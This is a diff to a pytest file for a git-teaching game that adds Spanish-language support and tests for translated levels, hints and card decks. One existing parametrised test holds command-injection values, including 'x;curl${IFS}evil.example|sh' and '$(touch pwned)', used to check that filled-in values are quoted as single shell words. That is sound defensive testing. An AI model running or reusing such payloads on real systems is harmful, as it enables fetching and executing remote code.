@@ -10,6 +10,7 @@ from collections.abc import Callable, Sequence
 from concurrent.futures import ThreadPoolExecutor
 from datetime import date, datetime, timedelta
 from pathlib import Path
+from typing import Any
 
 import pytest
 from termlab import sandbox
@@ -27,6 +28,7 @@ from firstcommit import (
     markup,
     playground,
     reactions,
+    reactions_es,
     records,
     repomap,
     runner,
@@ -34,10 +36,35 @@ from firstcommit import (
     score,
 )
 from firstcommit.chapters import BLURBS, CHAPTERS
+from sample_levels import cargo_sample_es
 
 pytestmark = pytest.mark.usefixtures("sample_decks")
 
 HELLO_BLOB = "ce013625030ba8dba906f756967f9e9ca394464a"
+
+
+def replaced(level: runner.Level, **changes: Any) -> runner.Level:
+    """
+    Change a level record as its module would change, its texts following: an English-only level.
+
+    Parameters
+    ----------
+    level : runner.Level
+        The level.
+    **changes : Any
+        New values of its fields, plus ``question`` and ``placeholder`` for its English texts.
+
+    Returns
+    -------
+    runner.Level
+        The changed level; its texts in every language are the English ones, with the steps of
+        its new quest.
+    """
+    english = level.texts["en"]
+    asked = {"question": changes.pop("question", english.question), "placeholder": changes.pop("placeholder", english.placeholder)}
+    steps = {step.id: runner.step_text(step) for step in changes.get("quest", level.quest)}
+    texts = dataclasses.replace(english, steps=steps, **asked)
+    return dataclasses.replace(level, texts={"en": texts, "es": texts}, **changes)
 
 
 def fake_snapshot(path: Path) -> repomap.Snapshot:
@@ -260,7 +287,7 @@ def text_of(blocks: list[markup.Block]) -> str:
 def test_a_new_player_sees_every_chapter_no_xp_and_nothing_in_progress(sample_level: runner.Level) -> None:
     status = game.status()
     assert (status["xp"], status["rank"], status["active"], status["last_payout"], status["cards_due"]) == (0, score.rank(0), None, None, 0)
-    assert [(chapter["id"], chapter["title"]) for chapter in status["chapters"]] == list(CHAPTERS.items())
+    assert [(chapter["id"], chapter["title"]) for chapter in status["chapters"]] == [(chapter, titles["en"]) for chapter, titles in CHAPTERS.items()]
     assert status["max_difficulty"] == max(runner.DIFFICULTIES) == 3
     chapters = {chapter["id"]: chapter for chapter in status["chapters"]}
     cargo = chapters["cargo"]
@@ -272,11 +299,12 @@ def test_a_new_player_sees_every_chapter_no_xp_and_nothing_in_progress(sample_le
 
 
 def test_each_chapter_has_its_blurb(sample_level: runner.Level) -> None:
-    assert [chapter["blurb"] for chapter in game.status()["chapters"]] == [BLURBS[chapter] for chapter in CHAPTERS]
+    assert [chapter["blurb"] for chapter in game.status()["chapters"]] == [BLURBS[chapter]["en"] for chapter in CHAPTERS]
 
 
 def test_the_collection_holds_the_card_of_each_finished_level_in_play_order(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
-    other = dataclasses.replace(sample_level, id="cargo-other", card=kit.CommandCard(command="git status", text="Shows the three places."))
+    texts = {language: dataclasses.replace(text, card="Shows the three places.") for language, text in sample_level.texts.items()}
+    other = dataclasses.replace(sample_level, id="cargo-other", card=kit.CommandCard(command="git status", text="Shows the three places."), texts=texts)
     monkeypatch.setattr(runner, "catalogue", lambda: {sample_level.id: sample_level, other.id: other})
     assert game.status()["collection"] == []
     for level in (other, sample_level):
@@ -328,7 +356,7 @@ def test_the_page_may_check_automatically_once_the_quest_is_done(sample_level: r
 
 
 def test_the_page_may_check_a_level_without_a_quest_automatically_from_the_start(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
-    level = dataclasses.replace(sample_level, quest=())
+    level = replaced(sample_level, quest=())
     monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
     assert game.start(level.id)["auto_check"] is True
 
@@ -384,12 +412,12 @@ def test_starting_an_unknown_level_leaves_the_level_in_progress_alone(sample_lev
 
 def test_a_level_page_shows_its_briefing_steps_and_hint_count(sample_level: runner.Level) -> None:
     view = game.level(sample_level.id)
-    assert (view["id"], view["chapter"], view["chapter_title"], view["title"], view["difficulty"], view["xp"]) == ("cargo-sample", "cargo", CHAPTERS["cargo"], "Say hello", 1, 100)
+    assert (view["id"], view["chapter"], view["chapter_title"], view["title"], view["difficulty"], view["xp"]) == ("cargo-sample", "cargo", CHAPTERS["cargo"]["en"], "Say hello", 1, 100)
     assert (view["hints_total"], view["has_lesson"], view["hints"]) == (3, True, [])
     assert [(step["id"], step["kind"]) for step in view["steps"]] == [("look", "read"), ("stage", "watch"), ("branch", "answer")]
     assert view["steps"][1]["command"] == "git add hello.txt"
     assert view["steps"][2]["placeholder"] == "a branch name"
-    assert view["briefing"] == markup.parse(sample_level.briefing)
+    assert view["briefing"] == markup.parse(sample_level.texts["en"].briefing)
     assert (view["question"], view["placeholder"], view["debrief"]) == ([], "", None)
 
 
@@ -413,7 +441,7 @@ def test_a_scene_stays_seen_once_the_player_saw_it_until_a_reset(sample_level: r
 
 
 def test_a_level_solved_by_a_typed_answer_shows_its_question_filled_from_its_state(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
-    level = dataclasses.replace(sample_level, question="Which branch is `{{branch}}` on?", placeholder="like {{branch}}")
+    level = replaced(sample_level, question="Which branch is `{{branch}}` on?", placeholder="like {{branch}}")
     monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
     game.start(level.id)
     view = game.level(level.id)
@@ -433,7 +461,7 @@ def test_text_of_the_level_in_progress_is_filled_from_its_state(sample_level: ru
     [("trunk", "git switch trunk"), ("x;curl${IFS}evil.example|sh", "git switch 'x;curl${IFS}evil.example|sh'"), ("$(touch pwned)", "git switch '$(touch pwned)'")],
 )
 def test_a_value_filled_into_a_step_command_is_one_shell_word(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch, value: str, typed: str) -> None:
-    level = dataclasses.replace(sample_level, setup=lambda lab: {"branch": value}, quest=(kit.ReadStep(id="go", text="Switch to `{{branch}}`.", command="git switch {{branch}}"),))
+    level = replaced(sample_level, setup=lambda lab: {"branch": value}, quest=(kit.ReadStep(id="go", text="Switch to `{{branch}}`.", command="git switch {{branch}}"),))
     monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
     game.start(level.id)
     (step,) = game.level(level.id)["steps"]
@@ -445,7 +473,7 @@ def test_a_check_message_is_shown_as_written_never_filled_again(sample_level: ru
         return kit.Verdict(False, "These files are untracked: `{{expected}}`.")
 
     secret_step = kit.AnswerStep(id="secret", text="Which?", question="Which?", check=tells_untracked)
-    level = dataclasses.replace(sample_level, setup=lambda lab: {"expected": "4f2a9c1d"}, check=tells_untracked, quest=(secret_step,))
+    level = replaced(sample_level, setup=lambda lab: {"expected": "4f2a9c1d"}, check=tells_untracked, quest=(secret_step,))
     monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
     game.start(level.id)
     shown = markup.parse("These files are untracked: `{{expected}}`.")
@@ -457,7 +485,7 @@ def test_a_level_page_lists_the_hints_already_revealed(sample_level: runner.Leve
     game.start(sample_level.id)
     game.hint()
     game.hint()
-    assert game.level(sample_level.id)["hints"] == [markup.parse(hint) for hint in sample_level.hints[:2]]
+    assert game.level(sample_level.id)["hints"] == [markup.parse(hint) for hint in sample_level.texts["en"].hints[:2]]
 
 
 @pytest.mark.usefixtures("fake_insight")
@@ -494,7 +522,7 @@ def test_each_slide_tells_the_change_its_commands_made_as_the_live_feed_would(sa
 def test_a_slide_and_a_step_carry_their_more_parsed_like_their_text(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
     slide = kit.Slide(id="init", title="Init", text="x", run="git init -q", more="Why: `git init` makes `.git`.")
     step = kit.ReadStep(id="look", text="Look.", more="The staging area is the file `.git/index`.")
-    level = dataclasses.replace(sample_level, lesson=(slide,), quest=(step,))
+    level = replaced(sample_level, lesson=(slide,), quest=(step,))
     monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
     assert game.lesson(level.id)["slides"][0]["more"] == markup.parse("Why: `git init` makes `.git`.")
     assert game.level(level.id)["steps"][0]["more"] == markup.parse("The staging area is the file `.git/index`.")
@@ -640,7 +668,7 @@ def with_prediction(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch)
         The level.
     """
     guess = kit.ChoiceStep(id="guess", text="Guess first.", question="Does `git add` change the last commit?", options=("Yes", "No"), reveal="No: it only fills the staging area.")
-    level = dataclasses.replace(sample_level, quest=(guess, *sample_level.quest))
+    level = replaced(sample_level, quest=(guess, *sample_level.quest))
     monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
     return level
 
@@ -702,7 +730,7 @@ def as_challenge(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) ->
     """
     stage = next(step for step in sample_level.quest if step.id == "stage")
     goals = (kit.WatchStep(id="commit", text="A commit exists.", watch=committed), stage)
-    level = dataclasses.replace(sample_level, challenge=True, quest=goals)
+    level = replaced(sample_level, challenge=True, quest=goals)
     monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
     return level
 
@@ -839,7 +867,7 @@ def test_once_the_quest_is_done_the_automatic_check_ends_the_level(sample_level:
 
 def test_an_automatic_check_of_a_level_without_a_quest_checks_the_level(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
     calls: list[str | None] = []
-    level = counting(dataclasses.replace(sample_level, quest=()), calls)
+    level = counting(replaced(sample_level, quest=()), calls)
     monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
     game.start(level.id)
     assert game.check(None, auto=True)["message"] == markup.parse("`hello.txt` is not in a commit yet.")
@@ -890,7 +918,7 @@ def secret_is_main(lab: kit.Lab, state: kit.State, answer: str | None, typed: ki
 
 def test_text_the_player_sends_that_utf8_cannot_encode_is_only_a_wrong_answer(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
     secret_step = kit.AnswerStep(id="secret", text="Which branch?", question="Which?", check=secret_is_main)
-    level = dataclasses.replace(sample_level, check=secret_is_main, quest=(secret_step,))
+    level = replaced(sample_level, check=secret_is_main, quest=(secret_step,))
     monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
     game.start(level.id)
     for garbage in ["\ud800", "main\udfff", "\udcff" * 3]:
@@ -1062,7 +1090,7 @@ def listed(lab: kit.Lab, state: kit.State, answer: str | None = None, typed: kit
 
 def test_a_goal_sees_every_line_typed_since_the_level_started_without_an_observation(sample_level: runner.Level, game_home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
     step = kit.WatchStep(id="look", text="Look.", watch=lambda lab, state, typed: listed(lab, state, None, typed))
-    level = dataclasses.replace(sample_level, quest=(step,), check=listed)
+    level = replaced(sample_level, quest=(step,), check=listed)
     monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
     type_lines(game_home, ("ls", 0))
     game.start(level.id)
@@ -1138,16 +1166,16 @@ def test_hints_are_revealed_in_order_and_each_costs_its_share(sample_level: runn
     game.start(sample_level.id)
     first = game.hint()
     second = game.hint()
-    assert (first["hint"], first["used"], first["total"], first["cost"]) == (markup.parse(sample_level.hints[0]), 1, 3, 15)
-    assert (second["hint"], second["used"], second["cost"]) == (markup.parse(sample_level.hints[1]), 2, 15)
+    assert (first["hint"], first["used"], first["total"], first["cost"]) == (markup.parse(sample_level.texts["en"].hints[0]), 1, 3, 15)
+    assert (second["hint"], second["used"], second["cost"]) == (markup.parse(sample_level.texts["en"].hints[1]), 2, 15)
 
 
 def test_asking_for_a_hint_after_the_last_one_shows_it_again_for_free(sample_level: runner.Level) -> None:
     game.start(sample_level.id)
-    for _ in sample_level.hints:
+    for _ in sample_level.texts["en"].hints:
         game.hint()
     again = game.hint()
-    assert (again["hint"], again["used"], again["cost"]) == (markup.parse(sample_level.hints[-1]), 3, 0)
+    assert (again["hint"], again["used"], again["cost"]) == (markup.parse(sample_level.texts["en"].hints[-1]), 3, 0)
     assert active_record()["hints"] == 3
 
 
@@ -1730,7 +1758,7 @@ def test_answers_given_at_the_same_time_are_all_counted(sample_level: runner.Lev
 
 
 def test_a_chapters_notes_are_parsed_with_its_title(sample_level: runner.Level) -> None:
-    assert game.notes("cargo") == {"chapter": "cargo", "title": CHAPTERS["cargo"], "notes": markup.parse("The `three` areas.")}
+    assert game.notes("cargo") == {"chapter": "cargo", "title": CHAPTERS["cargo"]["en"], "notes": markup.parse("The `three` areas.")}
     assert game.notes("toolbox")["notes"] == []
 
 
@@ -1885,3 +1913,104 @@ def test_before_the_quest_is_done_an_automatic_check_still_points_to_the_next_st
     game.start(sample_level.id)
     polled = game.check(None, auto=True)
     assert (polled["lost"], polled["message"]) == (False, markup.parse(game.QUEST_FIRST.format(step=1, steps=3)))
+
+
+def test_the_game_speaks_english_until_the_player_picks_spanish(sample_level: runner.Level) -> None:
+    assert game.status()["language"] == "en"
+    game.set_language("es")
+    status = game.status()
+    assert status["language"] == save.load_progress()["language"] == "es"
+    assert [(chapter["title"], chapter["blurb"]) for chapter in status["chapters"]] == [(CHAPTERS[chapter]["es"], BLURBS[chapter]["es"]) for chapter in CHAPTERS]
+    cargo = next(chapter for chapter in status["chapters"] if chapter["id"] == "cargo")
+    assert cargo["levels"][0]["title"] == "Di hola"
+
+
+def test_only_a_language_the_game_speaks_can_be_picked(sample_level: runner.Level) -> None:
+    with pytest.raises(ValueError, match="fr"):
+        game.set_language("fr")
+    assert save.load_progress()["language"] == "en"
+
+
+def test_in_spanish_a_level_page_shows_its_spanish_texts(sample_level: runner.Level) -> None:
+    game.set_language("es")
+    view = game.level(sample_level.id)
+    assert (view["title"], view["chapter_title"]) == ("Di hola", CHAPTERS["cargo"]["es"])
+    assert view["briefing"] == markup.parse("Haz un commit de `hello.txt` en la rama `{{branch}}`.")
+    assert [frame["text"] for frame in view["scene"]] == [markup.parse(text) for text in cargo_sample_es.SCENE]
+    assert [frame["art"] for frame in view["scene"]] == ["zones", "conveyor"]
+    assert [step["text"] for step in view["steps"]] == [markup.parse(text.text) for text in cargo_sample_es.STEPS.values()]
+    assert view["steps"][1]["command"] == "git add hello.txt"
+    assert (view["steps"][2]["placeholder"], view["card"]) == ("un nombre de rama", {"level": "cargo-sample", "command": "git add <file>", "text": markup.parse(cargo_sample_es.CARD)})
+    assert game.lesson(sample_level.id)["title"] == "Di hola"
+
+
+def test_in_spanish_the_verdicts_hints_and_debrief_are_spanish(sample_level: runner.Level) -> None:
+    game.set_language("es")
+    game.start(sample_level.id)
+    assert game.check(None, auto=True)["message"] == markup.parse("La misión guiada aún no ha terminado: el siguiente es el paso 1 de 3.")
+    assert game.check(None, auto=False)["message"] == markup.parse(cargo_sample_es.NOT_COMMITTED)
+    game.quest_step(None)
+    assert game.quest_step(None)["message"] == markup.parse(cargo_sample_es.NOT_STAGED)
+    assert game.hint()["hint"] == markup.parse(cargo_sample_es.HINTS[0])
+    solve(sample_level)
+    result = game.check(None, auto=False)
+    assert (result["message"], result["debrief"]) == (markup.parse(cargo_sample_es.COMMITTED), markup.parse("`hello.txt` ya está en un commit en `trunk`."))
+
+
+def test_in_spanish_rama_reacts_in_spanish_with_the_levels_rules_and_the_shared_ones(sample_level: runner.Level, game_home: Path) -> None:
+    game.set_language("es")
+    game.start(sample_level.id)
+    game.observe()
+    kit.git(lab_project(game_home), "add", "hello.txt")
+    type_lines(game_home, ("ls", 0), ("git add hello.txt", 0))
+    assert game.observe()["reactions"] == [
+        {"line": "ls", "mood": "info", "text": markup.parse(reactions_es.LS_IN_REPOSITORY)},
+        {"line": "git add hello.txt", "mood": "ok", "text": markup.parse(cargo_sample_es.HELLO_STAGED)},
+    ]
+
+
+def test_in_spanish_a_prediction_shows_spanish_options_answered_with_their_english_values(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
+    level = with_prediction(sample_level, monkeypatch)
+    spanish = level.texts["es"]
+    guess = kit.StepText(text="Adivina primero.", question="¿Cambia `git add` el último commit?", options=("Sí", "No"), reveal="No: solo llena el área de preparación.")
+    translated = dataclasses.replace(spanish, steps={**spanish.steps, "guess": guess})
+    level = dataclasses.replace(level, texts={"en": level.texts["en"], "es": translated})
+    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
+    game.set_language("es")
+    step = game.level(level.id)["steps"][0]
+    assert (step["text"], step["question"]) == (markup.parse("Adivina primero."), markup.parse("¿Cambia `git add` el último commit?"))
+    assert step["choices"] == [{"value": "Yes", "text": markup.parse("Sí")}, {"value": "No", "text": markup.parse("No")}]
+    game.start(level.id)
+    assert game.quest_step("Sí")["message"] == markup.parse("Elige una de las opciones.")
+    assert game.quest_step("Yes")["message"] == markup.parse("No: solo llena el área de preparación.")
+
+
+SPANISH_CARGO_DECK = 'notes = """\nLas `three` zonas.\n"""\n' + "".join(
+    f'\n[[card]]\nid = "cargo-c{number:02}"\nprompt = "¿Cuál es `right`?"\ncorrect = "la buena"\nwrong = ["la mala", "la peor"]\nexplain = "Porque sí."\n'
+    for number in range(1, 11)
+)
+SPANISH_CARGO_DECK += """
+[[card]]
+id = "cargo-predict"
+prompt = "¿Qué imprime?"
+explain = "Hace eco."
+
+[[card]]
+id = "cargo-text"
+prompt = "Nombra la rama por defecto."
+accept = ["main", "la rama main"]
+placeholder = "una rama"
+explain = "La fija el juego."
+"""
+
+
+def test_in_spanish_cards_and_notes_are_spanish_and_choices_answer_with_their_english_values(sample_level: runner.Level, sample_decks: Path) -> None:
+    (sample_decks / "cargo.es.toml").write_text(SPANISH_CARGO_DECK)
+    game.set_language("es")
+    assert game.notes("cargo") == {"chapter": "cargo", "title": CHAPTERS["cargo"]["es"], "notes": markup.parse("Las `three` zonas.")}
+    view = next(card for card in game.due_cards("cargo", 20) if card["id"] == "cargo-c01")
+    assert view["prompt"] == markup.parse("¿Cuál es `right`?")
+    assert sorted((choice["value"], choice["text"]) for choice in view["choices"]) == [(value, markup.parse(text)) for value, text in [("right", "la buena"), ("worse", "la peor"), ("wrong", "la mala")]]
+    result = game.answer_card("cargo-c01", "right")
+    assert (result["correct"], result["answer"], result["answer_text"], result["explain"]) == (True, "right", markup.parse("la buena"), markup.parse("Porque sí."))
+    assert game.answer_card("cargo-text", "La rama main")["correct"]
